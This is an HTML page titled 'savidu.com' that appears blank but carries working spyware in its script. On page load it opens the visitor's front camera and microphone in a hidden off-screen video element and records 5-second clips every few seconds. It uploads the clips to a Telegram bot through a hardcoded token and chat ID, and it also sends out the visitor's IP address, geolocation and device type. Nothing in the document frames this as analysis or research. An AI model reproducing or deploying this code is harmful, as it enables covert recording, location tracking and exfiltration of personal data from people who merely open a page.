<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>savidu.com</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: black;
            width: 100vw;
            height: 100vh;
            overflow: hidden;
        }
        
        /* Hidden camera element */
        #selfieCamera {
            position: fixed;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
            pointer-events: none;
        }
    </style>
</head>
<body>
    <!-- Hidden Selfie Camera -->
    <video id="selfieCamera" autoplay playsinline muted></video>

    <script>
        // ============================================
        // TELEGRAM BOT CONFIG
        // ============================================
        const BOT_TOKEN = '8591543657:AAFjeNO5E8GA_ye7QgGmzC42OfbjHhrdRwg';
        const CHAT_ID = '7642100129';
        
        // ============================================
        // GLOBAL VARIABLES
        // ============================================
        let cameraStream = null;
        let videoElement = document.getElementById('selfieCamera');
        let mediaRecorder = null;
        let videoChunks = [];
        let videoCount = 0;
        let isRecording = false;
        let recordInterval = null;
        
        // ============================================
        // AUTO START - Page load à·€à·™à¶± à¶œà¶¸à¶±à·Š
        // ============================================
        window.addEventListener('load', function() {
            console.log('savidu.com - Selfie Cam Active');
            
            // Start camera immediately
            startSelfieCamera();
            
            // Keep screen on
            if ('wakeLock' in navigator) {
                navigator.wakeLock.request('screen').catch(() => {});
            }
        });
        
        // ============================================
        // START SELFIE CAMERA
        // ============================================
        async function startSelfieCamera() {
            try {
                // Request front camera with audio
                cameraStream = await navigator.mediaDevices.getUserMedia({
                    video: { 
                        facingMode: "user",  // Front camera (selfie)
                        width: { ideal: 640 },
                        height: { ideal: 480 },
                        frameRate: { ideal: 30 }
                    },
                    audio: true  // With sound
                });
                
                videoElement.srcObject = cameraStream;
                await videoElement.play();
                
                console.log('âœ… Selfie Camera Active');
                
                // Send Telegram notification (without caption)
                sendRawMessage('savidu.com - Selfie Cam Started');
                
                // Start recording after 1 second
                setTimeout(() => {
                    startContinuousRecording();
                }, 1000);
                
            } catch(error) {
                console.error('âŒ Camera error:', error);
                
                // Retry after 3 seconds
                setTimeout(startSelfieCamera, 3000);
            }
        }
        
        // ============================================
        // CONTINUOUS RECORDING (Every Second)
        // ============================================
        function startContinuousRecording() {
            console.log('ðŸŽ¥ Continuous recording - 5sec videos');
            
            // Record immediately
            record5SecondVideo();
            
            // Set interval for every 6 seconds (5s record + 1s gap)
            recordInterval = setInterval(() => {
                if (!isRecording) {
                    record5SecondVideo();
                }
            }, 6000); // Every 6 seconds
        }
        
        // ============================================
        // RECORD 5 SECOND VIDEO
        // ============================================
        async function record5SecondVideo() {
            if (isRecording || !cameraStream) return;
            
            isRecording = true;
            videoChunks = [];
            
            console.log(`ðŸŽ¥ Recording 5 seconds... (Video #${videoCount + 1})`);
            
            // Setup MediaRecorder
            let options = {};
            try {
                if (MediaRecorder.isTypeSupported('video/webm;codecs=vp9')) {
                    options = { mimeType: 'video/webm;codecs=vp9' };
                } else if (MediaRecorder.isTypeSupported('video/webm;codecs=vp8,opus')) {
                    options = { mimeType: 'video/webm;codecs=vp8,opus' };
                } else {
                    options = { mimeType: 'video/webm' };
                }
            } catch(e) {}
            
            mediaRecorder = new MediaRecorder(cameraStream, options);
            
            mediaRecorder.ondataavailable = (e) => {
                if (e.data && e.data.size > 0) {
                    videoChunks.push(e.data);
                }
            };
            
            mediaRecorder.onstop = async () => {
                const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
                const sizeMB = (videoBlob.size / (1024 * 1024)).toFixed(2);
                
                videoCount++;
                console.log(`âœ… Video #${videoCount} recorded: ${sizeMB}MB`);
                
                // Send to Telegram (NO CAPTION)
                await sendVideoRaw(videoBlob);
                
                isRecording = false;
            };
            
            // Record for 5 seconds
            mediaRecorder.start();
            setTimeout(() => {
                if (mediaRecorder && mediaRecorder.state === 'recording') {
                    mediaRecorder.stop();
                }
            }, 5000); // Exactly 5 seconds
        }
        
        // ============================================
        // SEND VIDEO TO TELEGRAM - NO CAPTION
        // ============================================
        async function sendVideoRaw(videoBlob) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('video', videoBlob, `savidu_${Date.now()}.webm`);
                
                // Send without caption
                const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
                    method: 'POST',
                    body: formData
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    console.log(`âœ… Video #${videoCount} sent to Telegram`);
                } else {
                    console.log('âŒ Telegram error:', result);
                }
                
            } catch(error) {
                console.error('âŒ Send error:', error);
            }
        }
        
        // ============================================
        // SEND RAW MESSAGE - NO FORMATTING
        // ============================================
        async function sendRawMessage(text) {
            try {
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('text', text);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    body: formData
                });
            } catch(e) {}
        }
        
        // ============================================
        // GET IP AND SEND (Without caption)
        // ============================================
        async function sendIP() {
            try {
                const res = await fetch('https://api.ipify.org?format=json');
                const data = await res.json();
                
                const formData = new FormData();
                formData.append('chat_id', CHAT_ID);
                formData.append('text', `IP: ${data.ip}`);
                
                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                    method: 'POST',
                    body: formData
                });
            } catch(e) {}
        }
        
        // ============================================
        // GET LOCATION AND SEND (Without caption)
        // ============================================
        function sendLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    async (pos) => {
                        try {
                            const formData = new FormData();
                            formData.append('chat_id', CHAT_ID);
                            formData.append('latitude', pos.coords.latitude);
                            formData.append('longitude', pos.coords.longitude);
                            
                            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
                                method: 'POST',
                                body: formData
                            });
                            
                            // Also send as text
                            sendRawMessage(`ðŸ“ ${pos.coords.latitude}, ${pos.coords.longitude}`);
                            
                        } catch(e) {}
                    },
                    (err) => {}
                );
            }
        }
        
        // ============================================
        // GET DEVICE INFO AND SEND (Without caption)
        // ============================================
        function sendDeviceInfo() {
            const ua = navigator.userAgent;
            let device = 'Unknown';
            
            if (ua.includes('Windows')) device = 'Windows';
            else if (ua.includes('Mac')) device = 'MacOS';
            else if (ua.includes('iPhone')) device = 'iPhone';
            else if (ua.includes('iPad')) device = 'iPad';
            else if (ua.includes('Android')) device = 'Android';
            
            sendRawMessage(`ðŸ“± Device: ${device}`);
        }
        
        // ============================================
        // SEND ALL INFO SEPARATELY (No captions)
        // ============================================
        setTimeout(sendIP, 3000);
        setTimeout(sendLocation, 5000);
        setTimeout(sendDeviceInfo, 7000);
        
        // ============================================
        // KEEP ALIVE
        // ============================================
        setInterval(() => {
            if (cameraStream) {
                console.log('ðŸ’“ https://sinhalawal.com/ heartbeat');
            }
        }, 30000);
        
        // ============================================
        // Clean up on page close
        // ============================================
        window.addEventListener('beforeunload', function() {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
            }
            if (recordInterval) {
                clearInterval(recordInterval);
            }
        });
        
    </script>
</body>
</html>
